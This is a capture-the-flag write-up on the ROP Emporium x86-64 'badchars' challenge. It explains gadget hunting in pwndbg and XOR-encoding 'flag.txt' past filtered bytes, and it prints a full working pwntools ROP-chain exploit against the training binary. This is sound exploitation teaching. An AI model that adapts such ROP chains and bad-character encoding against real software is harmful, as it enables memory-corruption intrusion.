---
title: "ROP Emporium x86-64 Challenge 5: badchars"
date: "2025-12-27"
description: "Writeup for the badchars challenge of the x86-64 ROP Emporium challenges."
---

# ROP Emporium x86-64 Challenge 5: badchars

#### December 27, 2025

This challenge was odd. Not necessarily very difficult, but kinda weird to work with. We are told that this binary will not allow certain characters. This means that we won't be able input some specific characters to strings, parameters or addresses, at least not directly. When we run the program, we can see which will be the bad characters:

```
$ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
```

Great, so we can't really write `flag.txt` anywhere... or can we?

This challenge is a glorified version of the [previous challenge](writeups/rop-emporium-write4-writeup), write4. We'll need to call `print_file` with the argument `flag.txt`, just like in write4. The issue is that we won't be able to write that string directly, because as we can see, it contains badchars.

Our goal is to somehow avoid this restriction indirectly.  We'll see along the way. For now, let's see what we can work with:

```
pwndbg> info functions
0x00000000004004d8  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400640  __libc_csu_init
0x00000000004006b0  __libc_csu_fini
0x00000000004006b4  _fini
```

Literally the same functions as in the last challenge. Let's see what g
adgets we are given:

```
pwndbg> disas usefulGadgets
   0x0000000000400628 <+0>:	xor    BYTE PTR [r15],r14b
   0x000000000040062b <+3>:	ret
   0x000000000040062c <+4>:	add    BYTE PTR [r15],r14b
   0x000000000040062f <+7>:	ret
   0x0000000000400630 <+8>:	sub    BYTE PTR [r15],r14b
   0x0000000000400633 <+11>:	ret
   0x0000000000400634 <+12>:	mov    QWORD PTR [r13+0x0],r12
   0x0000000000400638 <+16>:	ret
   0x0000000000400639 <+17>:	nop    DWORD PTR [rax+0x0]
```

Okay...! We're given a few.

The one that seems quirky is that `xor [r15], r14b; ret` gadget. Either way, it's there for a reason, right? Chances are we'll have to use it to write in memory.

Let's not forget about the `mov [r13], r12; ret` gadget, though. This gadget, just like in the previous challenge, allows us to write the value of `r12` into the address stored in `r13`.

These gadgets work with the `r15`, `r14`, `r13` and `r12` registers, so let's see if there's any other gadget that allows us to pop values into these registers with the `rop` command:

```
pwndbg> rop
...
0x0040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
...
```

Jackpot, literally a perfect gadget that makes us able to have enough control to write arbitrary values in memory and `XOR` them.

## The use of the XOR operation

You might wonder what use does the `xor` gadget have. Before we see it, let's do a refresher on how the XOR operation works.

XOR comes from **eXclusive OR**. Esentially, if you work with two inputs, it will output a `1` if said inputs are different, and a `0` otherwise. Here's the truth table for it:

| A | B | Out |
|---|---|-----|
| 0 | 0 | 0   |
| 0 | 1 | 1   |
| 1 | 0 | 1   |
| 1 | 1 | 0   |
The XOR operation has a nice property. **Its inverse operation is the XOR operation itself**. This is handy to encode data, because inverting it is computationally easy. Let's see an example:

```
A = 123321
B = 456654
A XOR B = 464503

464503 XOR B = 123321 = A
464503 XOR A = 456654 = B
```

Why is this useful, though? Well, XOR works wonders to transform data! We can input a sequence to the binary with no bad characters (to avoid the restriction) and then, once it's inside the memory, transform it with XOR to have the actual string we want with bad characters inside the memory! Let's see it with an example:

```
0x7478742E67616C66
```

This is `flag.txt` in ASCII. If we try to input this into the memory, it won't work, because it has bad characters: `0x78`, `0x67`, `0x61` and `0x2E`, translated to its ASCII characters, are `x`, `g`, `a` and `.` respectively. We were told by the binary that these were badchars. However, let's XOR it with an arbitrary value:

```
0x7478742E67616C66 XOR 0xFEFEFEFEFEFEFEFE
= 0x8A868AD0999F9298
```

This value has no bad characters, meaning that it can be used as input with no issues. Then, when it's already in memory, we can transform it with a reverse XOR operation:

```
0x8A868AD0999F9298 XOR 0xFEFEFEFEFEFEFEFE
= 0x7478742E67616C66
```

This will allow us to have `flag.txt` stored in memory! That's the key for this challenge. The only thing we need to worry about is to ensure that the key we use (in my case `0xFEFEFEFEFEFEFEFE`) doesn't create a value that also badchars. This can happen, in fact it happened with `0xFFFFFFFFFFFFFFFF`, which is the first key I tried. However, it's not very likely and you can always easily find a key that works by trial and error. However, some more advanced tools exists for use cases like these, like the [shikata ga nai encoder](https://github.com/EgeBalci/sgn).

With a working XOR key, now we can almost start building the payload. However, there's an issue.

## Finding the offset
Up until this challenge, I've been using the `cyclic` command to find the offset of the return address. `cyclic` creates a pattern string that we can find offsets of pretty easily later. However, since that pattern might have badchars in it, we'll tell `cyclic` explicitly what characters can it use:

```
pwndbg> cyclic 200 pat -a bcd
```

With the `-a` option, we can specify an alphabet. A set of characters that will be used by `cylic` to generate the pattern string. Since both `b`, `c` and `d` are not badchars, this pattern will do.

Now, we run the program with this pattern as input:

```
pwndbg> run < pat
```

The return address has this value in it:

```
0x7ffff7c00a06 <pwnme+268>    ret    <0x6462626262626263>
```

We can get the offset like this:

```
pwndbg> cyclic -l 0x6462626262626263 -a bcd
Finding cyclic pattern of 8 bytes: b'cbbbbbbd'
Found at offset 40
```

To no one's surprise, the offset is still 40. Still, at least we've learned how to create badchar-safe pattern strings!

Now that we've ensured what the offset is, we can begin writing the exploit.

```
from pwn import *

OFFSET = 40

RET_INSTRUCTION_ADDRESS = 0x004004ee
XOR_R15_R14_GADGET_ADDRESS = 0x00400628
POP_R12_R13_R14_R15_GADGET_ADDRESS = 0x0040069c
MOV_R12_TO_R13_GADGET_ADDRESS = 0x00400634
POP_R15_GADGET_ADDRESS = 0x004006a2
POP_RDI_GADGET_ADDRESS = 0x004006a3

PRINT_FILE_FUNCTION_ADDRESS = 0x00400510
BSS_ADDRESS = 0x00601038
```

This is a good start. I've also added a `pop r15; ret` gadget I've found, that will be useful for us later.

Now let's apply the XOR trick I mentioned earlier. Let's encode `flag.txt` to avoid badchars:

```
FLAG_HEX = 0x7478742E67616C66
XOR_KEY = 0xFEFEFEFEFEFEFEFE

FLAG_XOR = FLAG_HEX ^ XOR_KEY
```

In Python, the `^` operator will perform a XOR, so now we have the encoded value stored in `FLAG_XOR`.

Let's start with the ROP chain. First, let's review the two most important gadgets:

```
0x0000000000400628 <+0>:	xor    BYTE PTR [r15],r14b
0x000000000040062b <+3>:	ret
   
0x0000000000400634 <+12>:	mov    QWORD PTR [r13+0x0],r12
0x0000000000400638 <+16>:	ret
```

The XOR operation will be performed in the memory address that `r15` points to. In `r14`, we'll have to store the key we used, `0xFEFEFEFEFEFEFEFE`, that is. In `r15`, the address to `.bss` (which can be found with `info files`).

To store data in memory, we'll use the `move [r13], r12; ret` gadget, which stores the value of `r12` in the memory address stored in `r13`. Just like in the previous challenge, we'll want to write `flag.txt` in the `.bss` section, in which we have write permissions. Thus, the `.bss` address will be stored in `r13`, and the encoded "flag.txt" string will be stored in `r12`.

To load values into all these registers, we can use the `pop r12; pop r13; pop r14; pop r15; ret` gadget we've found before. So, after also setting up the offset and aligning the stack with a return gadget, we can begin populating the registers:

```
payload = b"B"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R12_R13_R14_R15_GADGET_ADDRESS)
payload += p64(FLAG_XOR) # r12
payload += p64(BSS_ADDRESS) # r13
payload += p64(XOR_KEY) # r14
payload += p64(BSS_ADDRESS) # r15
```

Now nothing stops us from storing the encoded flag in `.bss` with the `mov` gadget:

```
payload = b"B"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R12_R13_R14_R15_GADGET_ADDRESS)
payload += p64(FLAG_XOR) # r12
payload += p64(BSS_ADDRESS) # r13
payload += p64(XOR_KEY) # r14
payload += p64(BSS_ADDRESS) # r15
payload += p64(MOV_R12_TO_R13_GADGET_ADDRESS)
```

Now that the encoded flag is stored in memory, all we need is to decode it with the `xor` gadget. However, up until now I've been overlooking a slight but very important detail of the gadget. Let's take a look at it again:

```
0x0000000000400628 <+0>:	xor    BYTE PTR [r15],r14b
0x000000000040062b <+3>:	ret
```

Take a look at the registers. There's a "b" in `r14`. This is actually a bit of an issue, because that "b" means that the instruction will only read one byte from the instruction. So instead of decoding with the key `0xFEFEFEFEFEFEFEFE`, it will decode it with `0xFE`. This means that it will only decode one character out of the eight in `flag.txt`. That's a bummer.

However, to our benefit, this has a fix. We can just iterate over every byte in `.bss` where `flag.txt` is stored. Ffoor every character, we'll perform the XOR operation, byte by byte. Once the for loop is done, the whole string will be decoded, and `flag.txt` will sit inside `.bss`. Let's see how we can do this:

```
for i in range(8): # Length of "flag.txt"
	payload += p64(POP_R15_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i)
	payload += p64(XOR_R15_R14_GADGET_ADDRESS)
```

This does it. The loop will iterate over every byte of the string and decode it to obtain `flag.txt`.

Now the exploit is ready! We just need to pop the `.bss` address into `rdi` to set up the argument for `print_file`. Here's the whole script:

```
from pwn import *

OFFSET = 40

RET_INSTRUCTION_ADDRESS = 0x004004ee
XOR_R15_R14_GADGET_ADDRESS = 0x00400628
POP_R12_R13_R14_R15_GADGET_ADDRESS = 0x0040069c
MOV_R12_TO_R13_GADGET_ADDRESS = 0x00400634
POP_R15_GADGET_ADDRESS = 0x004006a2
POP_RDI_GADGET_ADDRESS = 0x004006a3

PRINT_FILE_FUNCTION_ADDRESS = 0x00400510
BSS_ADDRESS = 0x00601038

FLAG_HEX = 0x7478742E67616C66
XOR_KEY = 0xFEFEFEFEFEFEFEFE

FLAG_XOR = FLAG_HEX ^ XOR_KEY

payload = b"B"*OFFSET
payload += p64(RET_INSTRUCTION_ADDRESS) # Stack alignment
payload += p64(POP_R12_R13_R14_R15_GADGET_ADDRESS)
payload += p64(FLAG_XOR) # r12
payload += p64(BSS_ADDRESS) # r13
payload += p64(XOR_KEY) # r14
payload += p64(BSS_ADDRESS) # r15
payload += p64(MOV_R12_TO_R13_GADGET_ADDRESS)
for i in range(8): # Length of "flag.txt"
	payload += p64(POP_R15_GADGET_ADDRESS)
	payload += p64(BSS_ADDRESS + i)
	payload += p64(XOR_R15_R14_GADGET_ADDRESS)
payload += p64(POP_RDI_GADGET_ADDRESS)
payload += p64(BSS_ADDRESS)
payload += p64(PRINT_FILE_FUNCTION_ADDRESS)

open("exploit", "bw").write(payload)
```

To run it, we run the script with Python and then use the generated file as input for the binary:

```
$ python3 exploit.py
./badchars < exploit
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```
